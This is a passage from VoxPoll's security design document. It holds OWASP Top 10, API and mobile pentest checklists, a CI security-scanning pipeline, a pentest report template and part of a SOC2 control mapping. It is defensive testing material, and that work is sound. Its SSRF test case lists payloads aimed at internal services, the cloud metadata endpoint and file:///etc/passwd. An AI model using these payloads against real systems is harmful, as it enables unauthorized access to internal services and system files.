        voxpollControls: [
          "Server-side MFA enforcement",
          "OTP rate limiting",
          "OTP single-use with expiry"
        ]
      }
    ]
  },

  // ────────────────────────────────────────────────────────────────────────────
  // A08:2021 - SOFTWARE AND DATA INTEGRITY FAILURES
  // ────────────────────────────────────────────────────────────────────────────
  A08_INTEGRITY_FAILURES: {
    description: "Code and infrastructure integrity failures",
    tests: [
      {
        id: "A08-01",
        name: "CI/CD Security",
        method: "Review CI/CD pipeline security",
        targets: [
          "Pipeline access controls",
          "Secret management",
          "Build artifact integrity",
          "Deployment approvals"
        ],
        expectedResult: "Secure CI/CD with proper controls",
        voxpollControls: [
          "GitHub Actions with restricted secrets",
          "Branch protection rules",
          "Required reviews for production"
        ]
      },
      {
        id: "A08-02",
        name: "Insecure Deserialization",
        method: "Attempt to inject malicious serialized objects",
        targets: [
          "JWT payload manipulation",
          "Cookie tampering",
          "Request body parsing"
        ],
        expectedResult: "Deserialization attacks prevented",
        voxpollControls: [
          "JWT signature verification",
          "JSON.parse (not eval)",
          "Zod validation after parsing"
        ]
      }
    ]
  },

  // ────────────────────────────────────────────────────────────────────────────
  // A09:2021 - SECURITY LOGGING AND MONITORING FAILURES
  // ────────────────────────────────────────────────────────────────────────────
  A09_LOGGING_FAILURES: {
    description: "Insufficient logging and monitoring",
    tests: [
      {
        id: "A09-01",
        name: "Security Event Logging",
        method: "Verify logging of security events",
        targets: [
          "Failed login attempts",
          "Access control failures",
          "Input validation failures",
          "Admin actions"
        ],
        expectedResult: "All security events logged",
        voxpollControls: [
          "AuditLog service",
          "Security event types defined",
          "Centralized logging (ELK/CloudWatch)"
        ]
      },
      {
        id: "A09-02",
        name: "Log Integrity",
        method: "Verify logs cannot be tampered",
        targets: [
          "Log access controls",
          "Log immutability",
          "Centralized logging"
        ],
        expectedResult: "Logs protected from tampering",
        voxpollControls: [
          "CloudWatch Logs (immutable)",
          "No local log file access",
          "Log retention policies"
        ]
      },
      {
        id: "A09-03",
        name: "Alerting",
        method: "Verify alerting on security events",
        targets: [
          "Multiple failed logins",
          "Unusual access patterns",
          "High error rates"
        ],
        expectedResult: "Alerts triggered on suspicious activity",
        voxpollControls: [
          "CloudWatch Alarms",
          "PagerDuty/Slack integration",
          "Anomaly detection"
        ]
      }
    ]
  },

  // ────────────────────────────────────────────────────────────────────────────
  // A10:2021 - SERVER-SIDE REQUEST FORGERY (SSRF)
  // ────────────────────────────────────────────────────────────────────────────
  A10_SSRF: {
    description: "Fetching remote resources without validating user-supplied URL",
    tests: [
      {
        id: "A10-01",
        name: "SSRF via URL Input",
        method: "Inject internal URLs in user input",
        payloads: [
          "http://localhost/admin",
          "http://127.0.0.1:6379/",
          "http://169.254.169.254/latest/meta-data/",
          "http://internal-service.local/",
          "file:///etc/passwd"
        ],
        targets: [
          "Image URL preview",
          "Link preview/unfurling",
          "Webhook URLs",
          "OAuth callback URLs"
        ],
        expectedResult: "Internal and dangerous URLs blocked",
        voxpollControls: [
          "URL allowlist for external fetches",
          "Block private IP ranges",
          "Block file:// and other protocols",
          "No server-side URL fetching of user input"
        ]
      }
    ]
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// TYPE DEFINITIONS
// ══════════════════════════════════════════════════════════════════════════════

interface PentestFinding {
  id: string
  category: keyof typeof OWASP_TOP_10_CHECKLIST
  testId: string
  severity: "critical" | "high" | "medium" | "low" | "info"
  title: string
  description: string
  stepsToReproduce: string[]
  evidence: string
  recommendation: string
  cweId?: string
  cvssScore?: number
  status: "open" | "in_progress" | "resolved" | "accepted_risk"
}

interface PentestReport {
  id: string
  testDate: Date
  tester: string
  scope: string[]
  methodology: string
  findings: PentestFinding[]
  summary: {
    critical: number
    high: number
    medium: number
    low: number
    info: number
  }
  recommendations: string[]
  nextSteps: string[]
}
```

## 17.15.3 API-Specific Security Tests

```typescript
// ══════════════════════════════════════════════════════════════════════════════
// API SECURITY TESTING CHECKLIST
// ══════════════════════════════════════════════════════════════════════════════

const API_SECURITY_CHECKLIST = {
  // ────────────────────────────────────────────────────────────────────────────
  // AUTHENTICATION TESTS
  // ────────────────────────────────────────────────────────────────────────────
  AUTHENTICATION: [
    {
      id: "API-AUTH-01",
      name: "JWT Token Validation",
      tests: [
        "Expired token rejected",
        "Invalid signature rejected",
        "Algorithm confusion attack (none/HS256 when RS256 expected)",
        "Token with modified claims rejected",
        "Token from different environment rejected"
      ],
      voxpollEndpoints: [
        "All authenticated endpoints"
      ]
    },
    {
      id: "API-AUTH-02",
      name: "Refresh Token Security",
      tests: [
        "Refresh token rotation on use",
        "Old refresh token invalidated after rotation",
        "Refresh token cannot be used as access token",
        "Refresh token bound to device/fingerprint"
      ],
      voxpollEndpoints: [
        "POST /api/auth/refresh"
      ]
    },
    {
      id: "API-AUTH-03",
      name: "OAuth Security",
      tests: [
        "State parameter validated",
        "PKCE enforced for public clients",
        "Redirect URI strictly validated",
        "Authorization code single-use"
      ],
      voxpollEndpoints: [
        "GET /api/auth/google",
        "GET /api/auth/google/callback",
        "GET /api/auth/apple",
        "GET /api/auth/apple/callback"
      ]
    }
  ],

  // ────────────────────────────────────────────────────────────────────────────
  // AUTHORIZATION TESTS
  // ────────────────────────────────────────────────────────────────────────────
  AUTHORIZATION: [
    {
      id: "API-AUTHZ-01",
      name: "Resource Ownership",
      tests: [
        "User A cannot access User B's private polls",
        "User A cannot modify User B's content",
        "User A cannot delete User B's account",
        "User A cannot see User B's draft content"
      ],
      voxpollEndpoints: [
        "GET /api/polls/:id",
        "PUT /api/polls/:id",
        "DELETE /api/polls/:id",
        "GET /api/users/:id/private-data"
      ]
    },
    {
      id: "API-AUTHZ-02",
      name: "Role-Based Access",
      tests: [
        "Regular user cannot access admin endpoints",
        "Moderator can only access moderation endpoints",
        "Premium features blocked for free users",
        "Banned users blocked from all authenticated endpoints"
      ],
      voxpollEndpoints: [
        "/api/admin/*",
        "/api/moderation/*",
        "/api/premium/*"
      ]
    },
    {
      id: "API-AUTHZ-03",
      name: "Scope Enforcement",
      tests: [
        "Limited API keys respect their scope",
        "OAuth tokens limited to granted scopes",
        "Token downgrade attacks prevented"
      ],
      voxpollEndpoints: [
        "All endpoints using API keys"
      ]
    }
  ],

  // ────────────────────────────────────────────────────────────────────────────
  // INPUT VALIDATION TESTS
  // ────────────────────────────────────────────────────────────────────────────
  INPUT_VALIDATION: [
    {
      id: "API-INPUT-01",
      name: "Schema Validation",
      tests: [
        "Missing required fields rejected",
        "Wrong data types rejected",
        "Extra fields ignored (not processed)",
        "Nested object validation",
        "Array length limits enforced"
      ],
      voxpollEndpoints: [
        "All POST/PUT/PATCH endpoints"
      ]
    },
    {
      id: "API-INPUT-02",
      name: "Boundary Testing",
      tests: [
        "Maximum string length enforced",
        "Negative numbers where not allowed",
        "Unicode edge cases handled",
        "Empty strings vs null handling",
        "Large number handling (BigInt)"
      ],
      payloads: {
        maxString: "A".repeat(100000),
        negativeNumber: -1,
        unicodeEdge: "\\u0000\\uFFFF",
        emptyVsNull: ["", null, undefined]
      }
    },
    {
      id: "API-INPUT-03",
      name: "File Upload Security",
      tests: [
        "File type validation (magic bytes, not just extension)",
        "File size limits enforced",
        "Filename sanitization",
        "No path traversal in filename",
        "Virus/malware scanning"
      ],
      voxpollEndpoints: [
        "POST /api/media/upload",
        "PUT /api/users/avatar"
      ]
    }
  ],

  // ────────────────────────────────────────────────────────────────────────────
  // RATE LIMITING TESTS
  // ────────────────────────────────────────────────────────────────────────────
  RATE_LIMITING: [
    {
      id: "API-RATE-01",
      name: "Rate Limit Enforcement",
      tests: [
        "Global rate limit enforced",
        "Per-endpoint rate limits enforced",
        "Per-user rate limits enforced",
        "Rate limit headers returned",
        "429 response on limit exceeded"
      ],
      expectedHeaders: [
        "X-RateLimit-Limit",
        "X-RateLimit-Remaining",
        "X-RateLimit-Reset",
        "Retry-After (on 429)"
      ]
    },
    {
      id: "API-RATE-02",
      name: "Rate Limit Bypass Prevention",
      tests: [
        "X-Forwarded-For spoofing blocked",
        "Distributed attack detection",
        "API key sharing detection"
      ]
    }
  ],

  // ────────────────────────────────────────────────────────────────────────────
  // DATA EXPOSURE TESTS
  // ────────────────────────────────────────────────────────────────────────────
  DATA_EXPOSURE: [
    {
      id: "API-DATA-01",
      name: "Sensitive Data Leakage",
      tests: [
        "Password hashes never returned",
        "Internal IDs not exposed (use public IDs)",
        "Email/phone masked in public responses",
        "Error messages don't leak internal info",
        "Stack traces not in production responses"
      ],
      checkResponsesFor: [
        "password",
        "passwordHash",
        "internalId",
        "_id",
        "stack",
        "errno"
      ]
    },
    {
      id: "API-DATA-02",
      name: "Mass Data Retrieval",
      tests: [
        "Pagination limits enforced",
        "No unbounded queries",
        "Cannot enumerate all users/content",
        "Export rate limited"
      ],
      voxpollEndpoints: [
        "GET /api/polls (list)",
        "GET /api/users (search)",
        "GET /api/export/*"
      ]
    }
  ]
}
```

## 17.15.4 Mobile Application Security Tests

```typescript
// ══════════════════════════════════════════════════════════════════════════════
// MOBILE APPLICATION SECURITY TESTING (OWASP MASTG)
// ══════════════════════════════════════════════════════════════════════════════

const MOBILE_SECURITY_CHECKLIST = {
  // ────────────────────────────────────────────────────────────────────────────
  // DATA STORAGE
  // ────────────────────────────────────────────────────────────────────────────
  DATA_STORAGE: [
    {
      id: "MOBILE-DATA-01",
      name: "Secure Storage",
      platform: "both",
      tests: [
        "Sensitive data in Keychain (iOS) / Keystore (Android)",
        "No sensitive data in SharedPreferences/UserDefaults",
        "No sensitive data in SQLite unencrypted",
        "No sensitive data in app logs",
        "No sensitive data in crash reports"
      ],
      voxpollControls: [
        "react-native-keychain for tokens",
        "AsyncStorage only for non-sensitive data",
        "Log redaction in production"
      ]
    },
    {
      id: "MOBILE-DATA-02",
      name: "Backup Security",
      platform: "both",
      tests: [
        "Sensitive data excluded from backups",
        "android:allowBackup=false or backup rules",
        "iOS data protection classes"
      ]
    },
    {
      id: "MOBILE-DATA-03",
      name: "Clipboard Security",
      platform: "both",
      tests: [
        "Sensitive data not copied to clipboard",
        "Clipboard cleared after paste",
        "Custom keyboards blocked on sensitive fields"
      ]
    }
  ],

  // ────────────────────────────────────────────────────────────────────────────
  // CRYPTOGRAPHY
  // ────────────────────────────────────────────────────────────────────────────
  CRYPTOGRAPHY: [
    {
      id: "MOBILE-CRYPTO-01",
      name: "Key Management",
      platform: "both",
      tests: [
        "No hardcoded crypto keys",
        "Keys stored in secure enclave when possible",
        "Key derivation uses appropriate algorithms",
        "No deprecated algorithms (MD5, SHA1, DES)"
      ]
    },
    {
      id: "MOBILE-CRYPTO-02",
      name: "TLS/SSL",
      platform: "both",
      tests: [
        "Certificate pinning implemented",
        "No custom trust managers accepting all certs",
        "TLS 1.2+ enforced",
        "Proper certificate validation"
      ],
      voxpollControls: [
        "react-native-ssl-pinning",
        "Pin backup certificates"
      ]
    }
  ],

  // ────────────────────────────────────────────────────────────────────────────
  // AUTHENTICATION
  // ────────────────────────────────────────────────────────────────────────────
  AUTHENTICATION: [
    {
      id: "MOBILE-AUTH-01",
      name: "Biometric Authentication",
      platform: "both",
      tests: [
        "Biometrics tied to keychain/keystore entry",
        "Fallback to passcode properly implemented",
        "Biometric changes detected (new fingerprint)",
        "No bypass via rooted/jailbroken device"
      ],
      voxpollControls: [
        "react-native-biometrics",
        "Biometric-protected keychain entries"
      ]
    },
    {
      id: "MOBILE-AUTH-02",
      name: "Session Management",
      platform: "both",
      tests: [
        "Session timeout enforced",
        "Token refresh transparent to user",
        "Logout clears all sensitive data",
        "Multiple device sessions handled"
      ]
    }
  ],

  // ────────────────────────────────────────────────────────────────────────────
  // PLATFORM SECURITY
  // ────────────────────────────────────────────────────────────────────────────
  PLATFORM_SECURITY: [
    {
      id: "MOBILE-PLAT-01",
      name: "iOS-Specific",
      platform: "ios",
      tests: [
        "App Transport Security (ATS) enabled",
        "No insecure URL schemes",
        "Keychain access groups configured",
        "No UIWebView (use WKWebView)",
        "Jailbreak detection"
      ]
    },
    {
      id: "MOBILE-PLAT-02",
      name: "Android-Specific",
      platform: "android",
      tests: [
        "android:debuggable=false",
        "android:exported=false for internal components",
        "Content providers secured",
        "Proper intent filter configuration",
        "Root detection"
      ]
    },
    {
      id: "MOBILE-PLAT-03",
      name: "WebView Security",
      platform: "both",
      tests: [
        "JavaScript disabled where not needed",
        "File access disabled",
        "No loadUrl with user input",
        "Input validation for bridge calls"
      ]
    }
  ],

  // ────────────────────────────────────────────────────────────────────────────
  // CODE QUALITY
  // ────────────────────────────────────────────────────────────────────────────
  CODE_QUALITY: [
    {
      id: "MOBILE-CODE-01",
      name: "Reverse Engineering Protection",
      platform: "both",
      tests: [
        "Code obfuscation (ProGuard/R8, Hermes)",
        "No sensitive logic in JavaScript (use native)",
        "Anti-tampering checks",
        "Debugger detection"
      ],
      voxpollControls: [
        "Hermes engine with bytecode",
        "ProGuard for Android native"
      ]
    },
    {
      id: "MOBILE-CODE-02",
      name: "Third-Party Libraries",
      platform: "both",
      tests: [
        "Dependencies scanned for vulnerabilities",
        "No outdated libraries",
        "Library permissions reviewed",
        "SDK privacy compliance"
      ]
    }
  ],

  // ────────────────────────────────────────────────────────────────────────────
  // NETWORK SECURITY
  // ────────────────────────────────────────────────────────────────────────────
  NETWORK: [
    {
      id: "MOBILE-NET-01",
      name: "Traffic Analysis",
      platform: "both",
      tests: [
        "All traffic encrypted (no HTTP)",
        "No sensitive data in URLs",
        "Certificate pinning prevents MITM",
        "Proper error handling on network failures"
      ],
      tools: [
        "Burp Suite",
        "Charles Proxy",
        "mitmproxy"
      ]
    }
  ]
}
```

## 17.15.5 Automated Security Testing Pipeline

```typescript
// ══════════════════════════════════════════════════════════════════════════════
// AUTOMATED SECURITY TESTING IN CI/CD
// ══════════════════════════════════════════════════════════════════════════════

const SECURITY_TESTING_PIPELINE = {
  // ────────────────────────────────────────────────────────────────────────────
  // PRE-COMMIT
  // ────────────────────────────────────────────────────────────────────────────
  preCommit: {
    tools: [
      {
        name: "gitleaks",
        purpose: "Detect secrets in code",
        command: "gitleaks detect --source . --verbose"
      },
      {
        name: "eslint-plugin-security",
        purpose: "Static analysis for JS security issues",
        command: "eslint --ext .ts,.tsx src/"
      }
    ]
  },

  // ────────────────────────────────────────────────────────────────────────────
  // CI PIPELINE (On every PR)
  // ────────────────────────────────────────────────────────────────────────────
  ciPipeline: {
    stages: [
      {
        name: "SAST",
        tools: [
          {
            name: "semgrep",
            purpose: "Static Application Security Testing",
            command: "semgrep --config=auto --error",
            rules: [
              "p/security-audit",
              "p/owasp-top-ten",
              "p/nodejs"
            ]
          },
          {
            name: "CodeQL",
            purpose: "GitHub Advanced Security",
            languages: ["javascript", "typescript"]
          }
        ]
      },
      {
        name: "Dependency Check",
        tools: [
          {
            name: "npm audit",
            command: "npm audit --audit-level=high",
            failOn: "high"
          },
          {
            name: "snyk",
            command: "snyk test --severity-threshold=high"
          }
        ]
      },
      {
        name: "Secret Scanning",
        tools: [
          {
            name: "trufflehog",
            command: "trufflehog git file://. --since-commit HEAD~1"
          }
        ]
      },
      {
        name: "Container Scanning",
        tools: [
          {
            name: "trivy",
            command: "trivy image voxpoll/api:latest",
            failOn: "HIGH,CRITICAL"
          }
        ]
      }
    ]
  },

  // ────────────────────────────────────────────────────────────────────────────
  // STAGING DEPLOYMENT (DAST)
  // ────────────────────────────────────────────────────────────────────────────
  stagingTests: {
    tools: [
      {
        name: "OWASP ZAP",
        purpose: "Dynamic Application Security Testing",
        mode: "api-scan",
        config: {
          target: "https://staging-api.voxpoll.app",
          openapi: "/api/docs/openapi.json",
          alertThreshold: "Medium",
          failAction: "warn"  // Don't block, but report
        }
      },
      {
        name: "nuclei",
        purpose: "Vulnerability scanning",
        command: "nuclei -u https://staging.voxpoll.app -t cves/"
      }
    ]
  },

  // ────────────────────────────────────────────────────────────────────────────
  // SCHEDULED SCANS
  // ────────────────────────────────────────────────────────────────────────────
  scheduledScans: {
    weekly: [
      {
        name: "Full OWASP ZAP Scan",
        schedule: "0 2 * * 0",  // Sunday 2 AM
        target: "production API",
        reportTo: "security@voxpoll.app"
      },
      {
        name: "SSL Labs Check",
        schedule: "0 3 * * 0",
        targets: [
          "api.voxpoll.app",
          "app.voxpoll.app"
        ]
      }
    ],
    monthly: [
      {
        name: "Penetration Test Prep",
        actions: [
          "Update asset inventory",
          "Review scope with pentest team",
          "Ensure staging environment matches production"
        ]
      }
    ]
  },

  // ────────────────────────────────────────────────────────────────────────────
  // GITHUB ACTIONS WORKFLOW
  // ────────────────────────────────────────────────────────────────────────────
  githubActionsExample: `
name: Security Checks

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 2 * * 0'  # Weekly Sunday 2 AM

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0  # Full history for secret scanning

      # Secret Scanning
      - name: Gitleaks
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}

      # Dependency Check
      - name: npm audit
        run: npm audit --audit-level=high

      # SAST
      - name: Semgrep
        uses: semgrep/semgrep-action@v1
        with:
          config: >-
            p/security-audit
            p/owasp-top-ten

      # Container Scan
      - name: Trivy
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'voxpoll/api:latest'
          severity: 'HIGH,CRITICAL'
          exit-code: '1'
  `
}

// ══════════════════════════════════════════════════════════════════════════════
// PENTEST REPORT TEMPLATE
// ══════════════════════════════════════════════════════════════════════════════

const PENTEST_REPORT_TEMPLATE = {
  sections: [
    "1. Executive Summary",
    "2. Scope and Methodology",
    "3. Risk Assessment Summary",
    "4. Detailed Findings",
    "5. Recommendations",
    "6. Appendices (evidence, tools used)"
  ],

  findingTemplate: {
    id: "FINDING-001",
    title: "",
    severity: "Critical | High | Medium | Low | Info",
    cvss: "0.0-10.0",
    cwe: "CWE-XXX",
    affectedComponents: [],
    description: "",
    impact: "",
    stepsToReproduce: [],
    evidence: "Screenshots, request/response",
    recommendation: "",
    references: []
  },

  severityDefinitions: {
    critical: "Immediate exploitation possible, full system compromise",
    high: "Exploitation likely, significant data exposure or service disruption",
    medium: "Exploitation requires specific conditions, moderate impact",
    low: "Minor impact, requires unusual circumstances",
    info: "Informational, best practice recommendation"
  }
}
```


# ══════════════════════════════════════════════════════════════════════════════
# 17.16 SOC2 COMPLIANCE MAPPING
# ══════════════════════════════════════════════════════════════════════════════

## 17.16.1 SOC2 Overview

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                       SOC2 TYPE II COMPLIANCE                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  SOC2 (System and Organization Controls 2) is an auditing framework        │
│  for service organizations to demonstrate security controls.               │
│                                                                             │
│  TRUST SERVICE CRITERIA:                                                    │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │ ✓ SECURITY (Required)       │ Protection against unauthorized     │   │
│  │                              │ access (physical and logical)       │   │
│  ├──────────────────────────────┼─────────────────────────────────────┤   │
│  │ ○ AVAILABILITY (Optional)   │ System available for operation      │   │
│  │                              │ and use as committed                │   │
│  ├──────────────────────────────┼─────────────────────────────────────┤   │
│  │ ○ PROCESSING INTEGRITY      │ System processing is complete,      │   │
│  │   (Optional)                 │ valid, accurate, and authorized    │   │
│  ├──────────────────────────────┼─────────────────────────────────────┤   │
│  │ ○ CONFIDENTIALITY (Optional)│ Information designated as          │   │
│  │                              │ confidential is protected          │   │
│  ├──────────────────────────────┼─────────────────────────────────────┤   │
│  │ ○ PRIVACY (Optional)        │ Personal information collected,     │   │
│  │                              │ used, retained, disclosed properly │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│  VOXPOLL SCOPE: Security + Availability + Privacy                          │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

## 17.16.2 Security Trust Criteria (CC Series)

```typescript
// ══════════════════════════════════════════════════════════════════════════════
// SOC2 SECURITY CRITERIA (COMMON CRITERIA) MAPPING
// ══════════════════════════════════════════════════════════════════════════════

const SOC2_SECURITY_MAPPING = {
  // ────────────────────────────────────────────────────────────────────────────
  // CC1: CONTROL ENVIRONMENT
  // ────────────────────────────────────────────────────────────────────────────
  CC1: {
    name: "Control Environment",
    criteria: {
      "CC1.1": {
        requirement: "COSO Principle 1: Demonstrates commitment to integrity and ethical values",
        voxpollControls: [
          "Code of Conduct policy",
          "Employee handbook with security responsibilities",
          "Background checks for employees with data access"
        ],
        evidence: [
          "Policy documents",
          "Signed acknowledgments",
          "Background check records"
        ]
      },
      "CC1.2": {
        requirement: "COSO Principle 2: Board exercises oversight responsibility",
        voxpollControls: [
          "Board reviews security reports quarterly",
          "Security budget approved by leadership",
          "Incident escalation to board defined"
        ],
        evidence: [
          "Board meeting minutes",
          "Security review presentations",
          "Escalation procedures"
        ]
      },
      "CC1.3": {
        requirement: "COSO Principle 3: Establishes structure, authority, and responsibility",
        voxpollControls: [
          "Security organization chart",
          "RACI matrix for security functions",
          "Clear ownership of security controls"
        ],
        evidence: [
          "Org chart with security roles",
          "RACI documentation",
          "Job descriptions"
        ]
      },
      "CC1.4": {
        requirement: "COSO Principle 4: Demonstrates commitment to competence",
        voxpollControls: [
          "Security training program",
          "Annual security awareness training",
          "Role-specific security training"
        ],
        evidence: [
          "Training records",
          "Certification tracking",
          "Training completion reports"
        ]
      },
      "CC1.5": {
        requirement: "COSO Principle 5: Enforces accountability",
        voxpollControls: [
          "Security responsibilities in job descriptions",
          "Performance reviews include security metrics",
          "Security violation consequences defined"
        ],
        evidence: [
          "Job descriptions",
          "Performance review templates",
          "Disciplinary procedures"
        ]
      }
    }
  },

  // ────────────────────────────────────────────────────────────────────────────
  // CC2: COMMUNICATION AND INFORMATION
  // ────────────────────────────────────────────────────────────────────────────
  CC2: {
    name: "Communication and Information",
    criteria: {
      "CC2.1": {
        requirement: "Obtains relevant quality information to support internal control",
        voxpollControls: [
          "Security monitoring dashboards",
          "Vulnerability scan reports",
          "Incident reports",
          "Audit logs"
        ],
        evidence: [
          "Dashboard screenshots",
          "Sample vulnerability reports",
          "Incident ticket samples"
        ],
        voxpollImplementation: {
          description: "Centralized logging and monitoring",
          systems: [
            "CloudWatch for infrastructure metrics",
            "ELK Stack for application logs",
            "Sentry for error tracking",
            "PagerDuty for alerting"
          ]
        }
      },
      "CC2.2": {
        requirement: "Internally communicates information necessary to support internal control",
        voxpollControls: [
          "Security newsletter (monthly)",
          "Security Slack channel",
          "Security wiki/documentation",
          "Security training announcements"
        ],
        evidence: [
          "Newsletter samples",
          "Slack channel archive",
          "Documentation site"
        ]
      },
      "CC2.3": {
        requirement: "Communicates with external parties about matters affecting internal control",
        voxpollControls: [
          "Security page on website",
          "Responsible disclosure policy",
          "Vendor security assessments",
          "Customer security documentation"
        ],
        evidence: [
          "Security page URL",
          "Bug bounty program details",
          "Vendor questionnaire responses"
        ],
        voxpollImplementation: {
          securityPage: "https://voxpoll.app/security",
          bugBounty: "security@voxpoll.app",
          statusPage: "https://status.voxpoll.app"
        }
      }
    }
  },

  // ────────────────────────────────────────────────────────────────────────────
  // CC3: RISK ASSESSMENT
  // ────────────────────────────────────────────────────────────────────────────
  CC3: {
    name: "Risk Assessment",
    criteria: {
      "CC3.1": {
        requirement: "Specifies objectives with sufficient clarity",
        voxpollControls: [
          "Security objectives documented",
          "SLAs defined for security metrics",
          "Risk appetite defined"
        ],
        evidence: [
          "Security policy with objectives",
          "SLA documentation",
          "Risk appetite statement"
        ],
        voxpollImplementation: {
          securityObjectives: [
            "Protect user data from unauthorized access",
            "Maintain 99.9% availability",
            "Respond to incidents within SLA",
            "Maintain compliance with GDPR/KVKK"
          ]
        }
      },
      "CC3.2": {
        requirement: "Identifies and analyzes risks to achievement of objectives",
        voxpollControls: [
          "Annual risk assessment",
          "Threat modeling for new features",
          "Risk register maintained",
          "Third-party risk assessments"
        ],
        evidence: [
          "Risk assessment report",
          "Threat models",
          "Risk register spreadsheet",
          "Vendor assessments"
        ],
        voxpollImplementation: {
          riskAssessmentCadence: "Annual + major releases",
          threatModelingTool: "STRIDE methodology",
          riskRegisterLocation: "Confluence/Notion"
        }
      },
      "CC3.3": {
        requirement: "Considers potential for fraud in assessing risks",
        voxpollControls: [
          "Fraud risk assessment",
          "Segregation of duties",
          "Audit logging for financial actions",
          "Anomaly detection"
        ],
        evidence: [
          "Fraud risk assessment document",
          "Access control matrix",
          "Audit log samples"
        ],
        voxpollImplementation: {
          fraudRisks: [
            "Fake accounts for vote manipulation",
            "Payment fraud for premium features",
            "Data scraping for competitive intelligence"
          ],
          mitigations: [
            "Bot detection and CAPTCHA",
            "Payment verification",
            "Rate limiting and fingerprinting"
          ]
        }
      },
      "CC3.4": {
        requirement: "Identifies and assesses changes that could significantly impact controls",
        voxpollControls: [
          "Change management process",
          "Security review for changes",
          "Impact assessment for major changes"
        ],
        evidence: [
          "Change management policy",
          "PR review requirements",
          "Change approval records"
        ]
      }
    }
  },

  // ────────────────────────────────────────────────────────────────────────────
  // CC4: MONITORING ACTIVITIES
  // ────────────────────────────────────────────────────────────────────────────
  CC4: {
    name: "Monitoring Activities",
    criteria: {
      "CC4.1": {
        requirement: "Selects and develops monitoring activities",
        voxpollControls: [
          "Continuous security monitoring",
          "Regular control testing",
          "Internal audits",
          "External penetration tests"
        ],
        evidence: [
          "Monitoring dashboard access",
          "Control test results",
          "Audit reports",
          "Pentest reports"
        ],
        voxpollImplementation: {
          monitoring: {
            realTime: [
              "CloudWatch alerts",
              "Application error monitoring",
              "Failed login tracking"
            ],
            periodic: [
              "Weekly vulnerability scans",
              "Monthly access reviews",
              "Quarterly penetration tests"
            ]
          }
        }
      },
      "CC4.2": {
        requirement: "Evaluates and communicates internal control deficiencies",
        voxpollControls: [
          "Deficiency tracking system",
          "Remediation SLAs",
          "Management reporting",
          "Escalation procedures"
        ],
        evidence: [
          "Issue tracking (Jira)",
          "Remediation reports",
          "Management review meeting minutes"
        ]
      }
    }
  },

  // ────────────────────────────────────────────────────────────────────────────
  // CC5: CONTROL ACTIVITIES
  // ────────────────────────────────────────────────────────────────────────────
  CC5: {
    name: "Control Activities",
    criteria: {
      "CC5.1": {
        requirement: "Selects and develops control activities that mitigate risks",
        voxpollControls: [
          "Access control system",
          "Input validation",
          "Encryption controls",
          "Change management"
        ],
        evidence: [
          "Access control policy",
          "Code review showing validation",
          "Encryption configuration",
          "Change tickets"
        ],
        voxpollImplementation: {
          controlCategories: {
            preventive: [
              "Authentication (JWT)",
              "Authorization (RBAC)",
              "Input validation (Zod)",
              "Rate limiting"
            ],
            detective: [
              "Audit logging",
              "Anomaly detection",
              "Integrity monitoring"
            ],
            corrective: [
              "Incident response",
              "Backup restoration",
              "Account recovery"
            ]
          }
        }
      },
      "CC5.2": {
        requirement: "Selects and develops general controls over technology",
        voxpollControls: [
          "Infrastructure security controls",
          "Network security controls",
          "Database security controls",
          "Application security controls"
        ],
        evidence: [
          "AWS security configuration",
          "Network diagram",
          "Database access controls",
          "Application security headers"
        ]
      },
      "CC5.3": {
        requirement: "Deploys control activities through policies",
        voxpollControls: [
          "Information security policy",
          "Acceptable use policy",
          "Access control policy",
          "Data classification policy"
        ],
        evidence: [
          "Policy documents",
          "Policy acknowledgment records",
          "Policy review history"
        ]
      }
    }
  },

  // ────────────────────────────────────────────────────────────────────────────
  // CC6: LOGICAL AND PHYSICAL ACCESS CONTROLS
  // ────────────────────────────────────────────────────────────────────────────
  CC6: {
    name: "Logical and Physical Access Controls",
    criteria: {
      "CC6.1": {
        requirement: "Implements logical access security software",
        voxpollControls: [
          "Centralized identity management",
          "Role-based access control",
          "Multi-factor authentication",
          "Session management"
        ],
        evidence: [
          "IAM configuration",
          "Role definitions",
          "MFA enforcement evidence",
          "Session timeout settings"
        ],
        voxpollImplementation: {
          authentication: {
            method: "JWT + Refresh Token",
            mfaSupported: true,
            sessionTimeout: "15 min access, 7 day refresh",
            accountLockout: "5 failed attempts = 15 min lockout"
          },
          authorization: {
            model: "RBAC",
            roles: ["user", "premium", "creator", "moderator", "admin"],
            enforcement: "Middleware on all protected routes"
          }
        }
      },
      "CC6.2": {
        requirement: "Registers and authorizes users prior to issuing access credentials",
        voxpollControls: [
          "User registration process",
          "Email verification",
          "Employee onboarding process",
          "Access request workflow"
        ],
        evidence: [
          "Registration flow documentation",
          "Email verification logs",
          "Access request tickets",
          "Approval records"
        ]
      },
      "CC6.3": {
        requirement: "Authorizes and modifies access based on job function",
        voxpollControls: [
          "Role-based access provisioning",
          "Least privilege principle",
          "Access reviews",
          "Separation of duties"
        ],
        evidence: [
          "Access matrix",
          "Access review reports",
          "Role change tickets"
        ]
      },
      "CC6.4": {
        requirement: "Restricts physical access to facilities and assets",
        voxpollControls: [
          "AWS data centers (SOC2 certified)",
          "No on-premises infrastructure",
          "Laptop security policy",
          "Device encryption"
        ],
        evidence: [
          "AWS SOC2 report",
          "Laptop policy",
          "MDM configuration"
        ]
      },
      "CC6.5": {
        requirement: "Disposes of system components and data",
        voxpollControls: [
          "Data retention policy",
          "Data deletion procedures",
          "Secure disposal of hardware",
          "Database purge procedures"
        ],
        evidence: [
          "Retention policy",
          "Deletion logs",
          "Hardware disposal records"
        ]
      },
      "CC6.6": {
        requirement: "Restricts access to data to authorized personnel",
        voxpollControls: [
          "Database access controls",
          "Encryption at rest",
          "Data classification",
          "Production data access restrictions"
        ],
        evidence: [
          "Database user list",
          "Encryption configuration",
          "Data classification matrix"
        ],
        voxpollImplementation: {
          dataAccess: {
            production: "Limited to on-call engineers",
            pii: "Requires explicit approval and audit",
            logs: "Redacted by default"
          }
        }
      },
      "CC6.7": {
        requirement: "Protects data during transmission",
        voxpollControls: [
          "TLS 1.3 for all connections",
